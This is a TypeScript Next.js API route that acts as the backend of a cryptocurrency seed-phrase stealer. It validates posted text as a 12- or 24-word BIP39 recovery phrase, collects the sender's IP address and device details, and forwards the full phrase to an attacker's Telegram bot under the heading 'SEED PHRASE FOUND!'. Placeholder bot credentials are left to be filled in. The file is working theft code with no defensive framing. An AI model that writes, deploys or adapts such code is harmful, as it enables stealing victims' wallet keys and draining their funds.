import { NextResponse } from "next/server";
import { BIP39_ENGLISH_SET } from "@/lib/bip39-wordlist";

const TG_TOKEN = "YOUR_TG_BOT_TOKEN";
const TG_CHAT = "YOUR_CHAT_ID";

function parseUserAgent(ua: string): string {
  if (!ua || ua === "unknown") return "Unknown";

  let os = "Unknown OS";
  let browser = "Unknown Browser";

  if (ua.includes("Windows NT 10.0")) {
    os = ua.includes("Win64; x64") ? "Windows 10/11 (x64)" : "Windows 10/11";
  } else if (ua.includes("Windows NT 6.3")) {
    os = "Windows 8.1";
  } else if (ua.includes("Windows NT 6.2")) {
    os = "Windows 8";
  } else if (ua.includes("Windows NT 6.1")) {
    os = "Windows 7";
  } else if (ua.includes("Mac OS X")) {
    const match = ua.match(/Mac OS X (\d+[._]\d+)/);
    os = match ? `macOS ${match[1].replace("_", ".")}` : "macOS";
  } else if (ua.includes("Android")) {
    const match = ua.match(/Android (\d+\.?\d*)/);
    os = match ? `Android ${match[1]}` : "Android";
  } else if (ua.includes("iPhone") || ua.includes("iPad")) {
    const match = ua.match(/OS (\d+[._]\d+)/);
    os = match ? `iOS ${match[1].replace("_", ".")}` : "iOS";
  } else if (ua.includes("CrOS")) {
    os = "Chrome OS";
  } else if (ua.includes("Linux")) {
    os = "Linux";
  }

  if (ua.includes("OPR") || ua.includes("Opera")) {
    const match = ua.match(/OPR\/(\d+)/);
    browser = match ? `Opera ${match[1]}` : "Opera";
  } else if (ua.includes("Edg/")) {
    const match = ua.match(/Edg\/(\d+)/);
    browser = match ? `Edge ${match[1]}` : "Edge";
  } else if (ua.includes("YaBrowser")) {
    const match = ua.match(/YaBrowser\/(\d+)/);
    browser = match ? `Yandex ${match[1]}` : "Yandex Browser";
  } else if (ua.includes("Vivaldi")) {
    const match = ua.match(/Vivaldi\/(\d+)/);
    browser = match ? `Vivaldi ${match[1]}` : "Vivaldi";
  } else if (ua.includes("Brave")) {
    browser = "Brave";
  } else if (ua.includes("Firefox")) {
    const match = ua.match(/Firefox\/(\d+)/);
    browser = match ? `Firefox ${match[1]}` : "Firefox";
  } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
    const match = ua.match(/Version\/(\d+)/);
    browser = match ? `Safari ${match[1]}` : "Safari";
  } else if (ua.includes("Chrome")) {
    const match = ua.match(/Chrome\/(\d+)/);
    browser = match ? `Chrome ${match[1]}` : "Chrome";
  }

  return `${os} • ${browser}`;
}

async function sendToTelegram(text: string) {
  const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TG_CHAT,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }),
  });
  const result = await res.json();
  if (!result.ok) {
    console.error("[REPORT] Telegram error:", JSON.stringify(result));
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { data, source } = body;

    if (!data || typeof data !== "string") {
      return NextResponse.json({ error: "Invalid data" }, { status: 400 });
    }

    const words = data.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
      return NextResponse.json({ error: "Invalid format" }, { status: 400 });
    }

    const allEnglish = words.every((w: string) => /^[a-z]+$/i.test(w));
    if (!allEnglish) {
      return NextResponse.json({ error: "Invalid words" }, { status: 400 });
    }

    const normalizedWords = words.map((w: string) => w.toLowerCase());
    const allValidBip39 = normalizedWords.every((w: string) => BIP39_ENGLISH_SET.has(w));
    
    if (!allValidBip39) {
      console.log("[REPORT] Rejected: not all words are valid BIP39");
      return NextResponse.json({ error: "Invalid BIP39 words" }, { status: 400 });
    }

    const ip =
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      request.headers.get("x-real-ip") ||
      "unknown";

    const ua = request.headers.get("user-agent") || "unknown";
    const device = parseUserAgent(ua);
    const time = new Date().toLocaleString("en-GB", { timeZone: "Europe/Moscow" });

    const message =
      `🚨 <b>SEED PHRASE FOUND!</b>\n` +
      `⏱ ${time}\n` +
      `🌐 IP: <code>${ip}</code>\n` +
      `🖥 ${device}\n` +
      `🔑 Words: ${words.length}\n` +
      `🔍 Source: ${source || "polling"}\n` +
      `📄 Phrase: <code>${data.slice(0, 300)}</code>`;

    await sendToTelegram(message);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("[REPORT] Error:", error);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}
